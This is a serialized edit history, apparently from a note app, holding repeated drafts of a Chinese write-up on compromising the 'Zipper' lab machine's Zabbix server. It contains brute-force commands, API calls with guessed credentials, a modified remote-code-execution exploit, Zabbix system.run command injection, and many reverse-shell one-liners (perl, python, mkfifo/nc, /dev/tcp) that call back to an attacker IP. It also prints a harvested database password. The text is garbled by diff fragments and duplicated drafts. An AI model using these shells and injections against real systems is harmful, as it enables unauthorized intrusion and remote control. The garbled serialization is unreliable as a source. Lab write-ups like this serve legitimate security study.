'{\"jsonrpc\":\"2.0\",\"method\":\"user.login\",\"params\":{ \"user\":\"zapper\",\"password\":\"zapper\"},\"auth\":null,\"id\":0}' http://10.10.10.108/zabbix/api_jsonrpc.php"]],[3060,3060],[3266,3266]]],[1569939442475,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6068,"r"],[1,6093,"\n"],[1,6120,"b"],[-1,6122,"b"],[-1,6272," "],[1,6277," "],[-1,6398,"\n"],[1,6402,"\n"],[-1,6750,"\n"],[-1,6863,""],[1,6863,"`"],[-1,6988,"`"],[1,6989,""]],[828,828],[6989,6989]]],[1569939442475,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6068,"r"],[-1,6092,"\n"],[-1,6120,"b"],[1,6123,"b"],[1,6272," "],[-1,6276," "],[1,6398,"\n"],[-1,6401,"\n"],[1,6750,"\n"],[1,6862,""],[-1,6862,"`"],[1,6988,"`"],[-1,6988,""]],[6989,6989],[828,828]]],[1569939403549,["whale@Whale",[[-1,3060," "]],[3061,3061],[3060,3060]]],[1569939922500,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6067,"r"],[1,6092,"\n"],[1,6119,"b"],[-1,6121,"b"],[-1,6271," "],[1,6276," "],[-1,6397,"\n"],[1,6401,"\n"],[-1,6749,"\n"],[-1,6862,""],[1,6862,"`"],[-1,6987,"`"],[1,6988,""]],[828,828],[6988,6988]]],[1569939922501,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6067,"r"],[-1,6091,"\n"],[-1,6119,"b"],[1,6122,"b"],[1,6271," "],[-1,6275," "],[1,6397,"\n"],[-1,6400,"\n"],[1,6749,"\n"],[1,6861,""],[-1,6861,"`"],[1,6987,"`"],[-1,6987,""]],[6988,6988],[828,828]]],[1569939884506,["whale@Whale",[[1,3266,"\n"]],[3265,3265],[3266,3266]]],[1569939885679,["whale@Whale",[[1,3266,"---"]],[3266,3266],[3269,3269]]],[1569939885911,["whale@Whale",[[1,3270,"\n"]],[3269,3269],[3270,3270]]],[1569939887008,["whale@Whale",[[1,3270,"curl -i -X POST -H 'Content-type:application/json' -d\n\n'{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{ \"output\":\n\n[\"hostid\",\"host\"],\"selectInterfaces\":[\"interfaceid\",\"ip\"]\n\n},\"auth\":\"7620466afc69242a93c6f28b7f89305c\",\"id\":0}'"]],[3270,3270],[3496,3496]]],[1569939891063,["whale@Whale",[[-1,3270,"curl -i -X POST -H 'Content-type:application/json' -d\n\n'{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{ \"output\":\n\n[\"hostid\",\"host\"],\"selectInterfaces\":[\"interfaceid\",\"ip\"]\n\n},\"auth\":\"7620466afc69242a93c6f28b7f89305c\",\"id\":0}'"]],[3496,3496],[3270,3270]]],[1569939894044,["whale@Whale",[[1,3270,"curl -i -X POST -H 'Content-type:application/json' -d\n\n'{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{ \"output\":\n\n[\"hostid\",\"host\"],\"selectInterfaces\":[\"interfaceid\",\"ip\"]\n\n},\"auth\":\"7620466afc69242a93c6f28b7f89305c\",\"id\":0}'"]],[3270,3270],[3496,3496]]],[1569939898705,["whale@Whale",[[-1,3270,"curl -i -X POST -H 'Content-type:application/json' -d\n\n'{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{ \"output\":\n\n[\"hostid\",\"host\"],\"selectInterfaces\":[\"interfaceid\",\"ip\"]\n\n},\"auth\":\"7620466afc69242a93c6f28b7f89305c\",\"id\":0}'"]],[3496,3496],[3270,3270]]],[1569939910882,["whale@Whale",[[1,3270,"curl -i -X POST -H 'Content-type:application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{ \"output\": [\"hostid\",\"host\"],\"selectInterfaces\":[\"interfaceid\",\"ip\"] },\"auth\":\"7620466afc69242a93c6f28b7f89305c\",\"id\":0}'"]],[3270,3270],[3493,3493]]],[1569939922399,["whale@Whale",[[1,3494,"\n"]],[3493,3493],[3494,3494]]],[1569939982485,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6296,"r"],[1,6321,"\n"],[1,6348,"b"],[-1,6350,"b"],[-1,6500," "],[1,6505," "],[-1,6626,"\n"],[1,6630,"\n"],[-1,6978,"\n"],[-1,7091,""],[1,7091,"`"],[-1,7216,"`"],[1,7217,""]],[828,828],[7217,7217]]],[1569939982485,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6296,"r"],[-1,6320,"\n"],[-1,6348,"b"],[1,6351,"b"],[1,6500," "],[-1,6504," "],[1,6626,"\n"],[-1,6629,"\n"],[1,6978,"\n"],[1,7090,""],[-1,7090,"`"],[1,7216,"`"],[-1,7216,""]],[7217,7217],[828,828]]],[1569939923341,["whale@Whale",[[1,3494,"http://10.10.10.108/zabbix/api_jsonrpc.php"]],[3494,3494],[3536,3536]]],[1569940042493,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6338,"r"],[1,6363,"\n"],[1,6390,"b"],[-1,6392,"b"],[-1,6542," "],[1,6547," "],[-1,6668,"\n"],[1,6672,"\n"],[-1,7020,"\n"],[-1,7133,""],[1,7133,"`"],[-1,7258,"`"],[1,7259,""]],[828,828],[7259,7259]]],[1569940042493,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6338,"r"],[-1,6362,"\n"],[-1,6390,"b"],[1,6393,"b"],[1,6542," "],[-1,6546," "],[1,6668,"\n"],[-1,6671,"\n"],[1,7020,"\n"],[1,7132,""],[-1,7132,"`"],[1,7258,"`"],[-1,7258,""]],[7259,7259],[828,828]]],[1569939990556,["whale@Whale",[[-1,3270,"curl -i -X POST -H 'Content-type:application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{ \"output\": [\"hostid\",\"host\"],\"selectInterfaces\":[\"interfaceid\",\"ip\"] },\"auth\":\"7620466afc69242a93c6f28b7f89305c\",\"id\":0}'\nhttp://10.10.10.108/zabbix/api_jsonrpc.php"]],[3270,3536],[3270,3270]]],[1569939991545,["whale@Whale",[[1,3270,"curl -i -X POST -H 'Content-type:application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{ \"output\": [\"hostid\",\"host\"],\"selectInterfaces\":[\"interfaceid\",\"ip\"] },\"auth\":\"7620466afc69242a93c6f28b7f89305c\",\"id\":0}' http://10.10.10.108/zabbix/api_jsonrpc.php"]],[3270,3270],[3536,3536]]],[1569940102486,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6338,"r"],[1,6363,"\n"],[1,6390,"b"],[-1,6392,"b"],[-1,6542," "],[1,6547," "],[-1,6668,"\n"],[1,6672,"\n"],[-1,7020,"\n"],[-1,7133,""],[1,7133,"`"],[-1,7258,"`"],[1,7259,""]],[828,828],[7259,7259]]],[1569940102486,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6338,"r"],[-1,6362,"\n"],[-1,6390,"b"],[1,6393,"b"],[1,6542," "],[-1,6546," "],[1,6668,"\n"],[-1,6671,"\n"],[1,7020,"\n"],[1,7132,""],[-1,7132,"`"],[1,7258,"`"],[-1,7258,""]],[7259,7259],[828,828]]],[1569940048984,["whale@Whale",[[-1,3451,"7620466afc69242a93c6f28b7f89305c"]],[3451,3483],[3451,3451]]],[1569940049774,["whale@Whale",[[1,3451,"41f0671de935913d9e80905c9f0ebd45"]],[3451,3451],[3483,3483]]],[1569940077882,["whale@Whale",[[-1,3451,"41f0671de935913d9e80905c9f0ebd45"],[1,3483,"z"]],[3451,3483],[3452,3452]]],[1569940078712,["whale@Whale",[[-1,3451,"z"]],[3452,3452],[3451,3451]]],[1569940102044,["whale@Whale",[[1,3451,"注意修改这里的hash是通过上一条命令得到的"]],[3451,3451],[3473,3473]]],[1569942934478,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6328,"r"],[1,6353,"\n"],[1,6380,"b"],[-1,6382,"b"],[-1,6532," "],[1,6537," "],[-1,6658,"\n"],[1,6662,"\n"],[-1,7010,"\n"],[-1,7123,""],[1,7123,"`"],[-1,7248,"`"],[1,7249,""]],[828,828],[7249,7249]]],[1569942934478,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6328,"r"],[-1,6352,"\n"],[-1,6380,"b"],[1,6383,"b"],[1,6532," "],[-1,6536," "],[1,6658,"\n"],[-1,6661,"\n"],[1,7010,"\n"],[1,7122,""],[-1,7122,"`"],[1,7248,"`"],[-1,7248,""]],[7249,7249],[828,828]]],[1569942921591,["whale@Whale",[[-1,6702,"1235"],[1,6706,"8444"]],[6702,6706],[6706,6706]]],[1569943054472,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6328,"r"],[1,6353,"\n"],[1,6380,"b"],[-1,6382,"b"],[-1,6532," "],[1,6537," "],[-1,6658,"\n"],[1,6662,"\n"],[-1,7010,"\n"],[-1,7123,""],[1,7123,"`"],[-1,7248,"`"],[1,7249,""]],[828,828],[7249,7249]]],[1569943054472,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6328,"r"],[-1,6352,"\n"],[-1,6380,"b"],[1,6383,"b"],[1,6532," "],[-1,6536," "],[1,6658,"\n"],[-1,6661,"\n"],[1,7010,"\n"],[1,7122,""],[-1,7122,"`"],[1,7248,"`"],[-1,7248,""]],[7249,7249],[828,828]]],[1569943019263,["whale@Whale",[[1,6662,"\n"]],[6661,6661],[6662,6662]]],[1569943025606,["whale@Whale",[[1,6662,"nc -lnvp 8444"]],[6662,6662],[6675,6675]]],[1569943027437,["whale@Whale",[[1,6676,"\n"]],[6675,6675],[6676,6676]]],[1569943032208,["whale@Whale",[[1,6899,"\n"]],[6898,6898],[6899,6899]]],[1569943033483,["whale@Whale",[[-1,6899,"\n"]],[6899,6899],[6898,6898]]],[1569943174484,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6328,"r"],[1,6353,"\n"],[1,6380,"b"],[-1,6382,"b"],[-1,6532," "],[1,6537," "],[-1,6658,"\n"],[1,6662,"\n"],[-1,7025,"\n"],[-1,7138,""],[1,7138,"`"],[-1,7263,"`"],[1,7264,""]],[828,828],[7264,7264]]],[1569943174485,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6328,"r"],[-1,6352,"\n"],[-1,6380,"b"],[1,6383,"b"],[1,6532," "],[-1,6536," "],[1,6658,"\n"],[-1,6661,"\n"],[1,7025,"\n"],[1,7137,""],[-1,7137,"`"],[1,7263,"`"],[-1,7263,""]],[7264,7264],[828,828]]],[1569943147524,["whale@Whale",[[1,6899,"\n"]],[6898,6898],[6899,6899]]],[1569943150007,["whale@Whale",[[1,6899,"nc 0"]],[6899,6899],[6903,6903]]],[1569943150748,["whale@Whale",[[-1,6902,"0"]],[6903,6903],[6902,6902]]],[1569943157398,["whale@Whale",[[1,6902,"-lnvp 8555"]],[6902,6902],[6912,6912]]],[1569943164459,["whale@Whale",[[-1,6998,"443"]],[6997,7001],[6998,6998]]],[1569943166060,["whale@Whale",[[1,6998,"555"]],[6998,6998],[7001,7001]]],[1569943415468,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6328,"r"],[1,6353,"\n"],[1,6380,"b"],[-1,6382,"b"],[-1,6532," "],[1,6537," "],[-1,6658,"\n"],[1,6662,"\n"],[-1,7039,"\n"],[-1,7152,""],[1,7152,"`"],[-1,7277,"`"],[1,7278,""]],[828,828],[7278,7278]]],[1569943415468,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6328,"r"],[-1,6352,"\n"],[-1,6380,"b"],[1,6383,"b"],[1,6532," "],[-1,6536," "],[1,6658,"\n"],[-1,6661,"\n"],[1,7039,"\n"],[1,7151,""],[-1,7151,"`"],[1,7277,"`"],[-1,7277,""]],[7278,7278],[828,828]]],[1569943383411,["whale@Whale",[[1,6897," | use "]],[6897,6897],[6904,6904]]],[1569943385136,["whale@Whale",[[-1,6900,"use "]],[6904,6904],[6900,6900]]],[1569943475464,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6328,"r"],[1,6353,"\n"],[1,6380,"b"],[-1,6382,"b"],[-1,6532," "],[1,6537," "],[-1,6658,"\n"],[1,6662,"\n"],[-1,7042,"\n"],[-1,7155,""],[1,7155,"`"],[-1,7280,"`"],[1,7281,""]],[828,828],[7281,7281]]],[1569943475464,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6328,"r"],[-1,6352,"\n"],[-1,6380,"b"],[1,6383,"b"],[1,6532," "],[-1,6536," "],[1,6658,"\n"],[-1,6661,"\n"],[1,7042,"\n"],[1,7154,""],[-1,7154,"`"],[1,7280,"`"],[-1,7280,""]],[7281,7281],[828,828]]],[1569943416401,["whale@Whale",[[1,6900,"nc -lvp 8443"]],[6900,6900],[6912,6912]]],[1569943596466,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,6328,"r"],[1,6353,"\n"],[1,6380,"b"],[-1,6382,"b"],[-1,6532," "],[1,6537," "],[-1,6658,"\n"],[1,6662,"\n"],[-1,7054,"\n"],[-1,7167,""],[1,7167,"`"],[-1,7292,"`"],[1,7293,""]],[828,828],[7293,7293]]],[1569943596467,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,6328,"r"],[-1,6352,"\n"],[-1,6380,"b"],[1,6383,"b"],[1,6532," "],[-1,6536," "],[1,6658,"\n"],[-1,6661,"\n"],[1,7054,"\n"],[1,7166,""],[-1,7166,"`"],[1,7292,"`"],[-1,7292,""]],[7293,7293],[828,828]]],[1569943567945,["whale@Whale",[[-1,6898,"| nc -lvp 8443"]],[6898,6912],[6898,6898]]]]],["f74cc79b-6b32-42a5-b53b-07cf34d21976",1570005047499,"zipper docker容器靶机渗透\n===\n你越功利，世界对你越神秘。废话不说，开始紧张刺激的渗透吧！\n\n## scan\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n以上结果说明ssh、web以及其他不明2端口开放，需要进一步做探测。\n---\nnc 10.10.10.108 10050\n结果没有任何提示或者报错，说明端口开放\n---\n于是进行版本扫描\nnmap 10.10.10.108 -p 10050\n10050/tcp open  zabbix-agent\n---\n2048端口扫描结果，提示端口关闭，于是忽略\n```\n## enumeration\n\n### ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。\n\n### web\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n/server-status (Status: 403)\n\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n```\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n\n---\n\n发现一个登陆表单，searchsploit zabbix，常规操作\n\n### 10050 port\nhttp://10.10.10.108:10050\nsearchsploit zabbix\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \n\nuse exploit/linux/misc/zabbix_server_exec\nuse exploit/unix/misc/zabbix_agent_exec\n\n---\n\n# writeup\nlog in as guest，在主页面发现了一个用户名Zipper，仔细查找网页内容，把zapper、Zipper、zipper添加到字典中进行爆破\n![14]($res/14.PNG)\n\n## 拿到服务器参数\n通过官网获得api使用方法：https://www.zabbix.com/documentation/3.0/manual/api\n\n![3]($res/3.PNG)\n\n```\ncurl -i -X POST -H 'Content-type:application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"user.login\",\"params\":{ \"user\":\"zapper\",\"password\":\"zapper\"},\"auth\":null,\"id\":0}' http://10.10.10.108/zabbix/api_jsonrpc.php\n---\ncurl -i -X POST -H 'Content-type:application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{ \"output\": [\"hostid\",\"host\"],\"selectInterfaces\":[\"interfaceid\",\"ip\"] },\"auth\":\"注意修改这里的hash是通过上一条命令得到的\",\"id\":0}' http://10.10.10.108/zabbix/api_jsonrpc.php\n```\n\n## 修改exp并执行\n通过api，查询到服务器参数，然后修改exp\n\n```\nsearchsploit -m exploits/hp/webapps/39937.py\n\nZABIX_ROOT = 'http://10.10.10.108/zabbix'\t### Zabbix IP-address\nlogin = 'zapper'\t\t### Zabbix login\npassword = 'zapper'\t### Zabbix password\nhostid = '10105'\t### Zabbix hostid\n\npython 39937.py 即可拿到webshell\n```\n![1]($res/1.PNG)\n\n## 反弹docker虚拟机的shell到本地\n```\n参考pentestmonkey的reverse shell\n反弹shell到本地。\n\nnc -lnvp 1234\n首先本地监听1234端口\n---\nwebshell执行以下命令\n方法一：perl -e 'use Socket;$i=\"10.10.14.10\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\n方法二：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1234 >/tmp/f\n---\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n反弹standard shell失败，没有找到python\n---\nSHELL=/bin/bash script -q /dev/null\n获得startard tty\n---\nfind / -name \"*.txt\" 2>/dev/null\n本意是查找user.txt\n\n结果显示了一个web的路径。\n/usr/share/zabbix/robots.txt\n\ncat /usr/share/zabbix/conf/zabbix.conf.php\n\n$DB['TYPE']     = 'MYSQL';\n$DB['SERVER']   = 'localhost';\n$DB['PORT']     = '0';\n$DB['DATABASE'] = 'zabbixdb';\n$DB['USER']     = 'zabbix';\n$DB['PASSWORD'] = 'f.YMeMd$pTbpY3-449';\n\nmysql -u zabbix -p \nf.YMeMd$pTbpY3-449     #输入密码\n页面提示\nERROR 1044 (42000): Access denied for user 'zabbix'@'localhost' to database 'f.YMeMd-449mysql'\n连接失败\n---\nls -al /\n-rwxr-xr-x   1 root root    0 Sep 30 21:33 .dockerenv\n发现一个docker目录，说明可能是虚拟机容器\n```\n## 反弹10.10.10.108的shell到本机\n\n### 信息搜集\n```\nnetstat -nr\nKernel IP routing table\nDestination     Gateway         Genmask         Flags   MSS Window  irtt Iface\n0.0.0.0         172.17.0.1      0.0.0.0         UG        0 0          0 eth0\n172.17.0.0      0.0.0.0         255.255.0.0     U         0 0          0 eth0\n查看路由表\n---\nifconfig，本地ip为172.17.0.2\n---\nnc -nv 172.17.0.1 10050\n用nc扫描网关的的10050端口，为open状态\n---\necho system.run[ ifconfig ] | nc 172.17.0.1 10050\n通过zabbix server system.run的系统特性，可以进行命令执行\n```\n![2]($res/2.PNG)\n\n```\necho system.run[ nc -e /bin/bash 10.10.14.10 1235 ] | nc 172.17.0.1 10050\n提示nc没有-e参数\n---\necho system.run[ perl -e 'use Socket;$i=\"10.10.14.10\";$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' ] | nc 172.17.0.1 10050\n提示ZBXD)ZBX_NOTSUPPORTEDInvalid item key format.\n---\necho system.run[ whereis python ] | nc 172.17.0.1 10050\necho system.run[ /usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' ] | nc 172.17.0.1 10050\n\nZBXD)ZBX_NOTSUPPORTEDInvalid item key format.\n连接失败\n---\necho system.run[ nc 10.10.14.10 1235 ] | nc 172.17.0.1 10050\n成功连接\n---\necho system.run[ /bin/sh -i >& /dev/tcp/10.10.14.10/1235 0>&1 ] | nc 172.17.0.1 10050\n\necho system.run[ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1235 >/tmp/f ] | nc 172.17.0.1 10050\n成功反弹172.10.0.1的/bin/sh到本地\n连上了是连上了，但总是会掉线\n---\nwhoami | ZBXDzabbix\necho $0 |  ZBXD/bin/sh\n\n```\nnc -lnvp 8444\n\nperl -e 'use Socket;$i=\"10.10.14.10\";$p=8444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' \n\nnc -lnvp 8555\necho \"system.run[ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 8555 >/tmp/f & ]\" | nc 172.17.0.1 10050\n\n\n## 存在的漏洞\n```\nguest匿名登陆+信息泄露\n弱密码\nweb api可访问，用来爆破登陆口令\nzabbix-agentweb版本漏洞-远程代码执行\nzabbix-server system.run远程代码执行\n```\n## 总结\n当遇到openbsd需要反弹shell的时候，nc -e没有这个参数。\n\n可以用命令`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`",[[1570005030122,["whale@Whale",[[-1,6614,"whoami | ZBXDzabbix\necho $0 |  ZBXD/bin/sh"],[1,6656,"echo \"system.run[(/bin/bash -c 'bash -i >/dev/tcp/10.10.14.10/1234 0<&1 2>&1 &')]\" | nc 172.17.0.1 10050"]],[6614,6656],[6718,6718]]],[1570005037010,["whale@Whale",[[-1,6724,"nc -lnvp 8444\n\nperl -e 'use Socket;$i=\"10.10.14.10\";$p=8444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' \n\nnc -lnvp 8555\necho \"system.run[ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 8555 >/tmp/f & ]\" | nc 172.17.0.1 10050\n"]],[6724,7100],[6724,6724]]]]],["0ccf0d23-0b49-49d2-9704-b00ecf9dc9c3",1570028419062,"zipper docker容器靶机渗透\n===\n你越功利，世界对你越神秘。废话不说，开始紧张刺激的渗透吧！\n\n## scan\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n以上结果说明ssh、web以及其他不明2端口开放，需要进一步做探测。\n---\nnc 10.10.10.108 10050\n结果没有任何提示或者报错，说明端口开放\n---\n于是进行版本扫描\nnmap 10.10.10.108 -p 10050\n10050/tcp open  zabbix-agent\n---\n2048端口扫描结果，提示端口关闭，于是忽略\n```\n## enumeration\n\n### ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。\n\n### web\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n/server-status (Status: 403)\n\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n```\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n\n---\n\n发现一个登陆表单，searchsploit zabbix，常规操作\n\n### 10050 port\nhttp://10.10.10.108:10050\nsearchsploit zabbix\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \n\nuse exploit/linux/misc/zabbix_server_exec\nuse exploit/unix/misc/zabbix_agent_exec\n\n---\n\n# writeup\nlog in as guest，在主页面发现了一个用户名Zipper，仔细查找网页内容，把zapper、Zipper、zipper添加到字典中进行爆破\n![14]($res/14.PNG)\n\n## 拿到服务器参数\n通过官网获得api使用方法：https://www.zabbix.com/documentation/3.0/manual/api\n\n![3]($res/3.PNG)\n\n```\ncurl -i -X POST -H 'Content-type:application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"user.login\",\"params\":{ \"user\":\"zapper\",\"password\":\"zapper\"},\"auth\":null,\"id\":0}' http://10.10.10.108/zabbix/api_jsonrpc.php\n---\ncurl -i -X POST -H 'Content-type:application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{ \"output\": [\"hostid\",\"host\"],\"selectInterfaces\":[\"interfaceid\",\"ip\"] },\"auth\":\"注意修改这里的hash是通过上一条命令得到的\",\"id\":0}' http://10.10.10.108/zabbix/api_jsonrpc.php\n```\n\n## 修改exp并执行\n通过api，查询到服务器参数，然后修改exp\n\n```\nsearchsploit -m exploits/hp/webapps/39937.py\n\nZABIX_ROOT = 'http://10.10.10.108/zabbix'\t### Zabbix IP-address\nlogin = 'zapper'\t\t### Zabbix login\npassword = 'zapper'\t### Zabbix 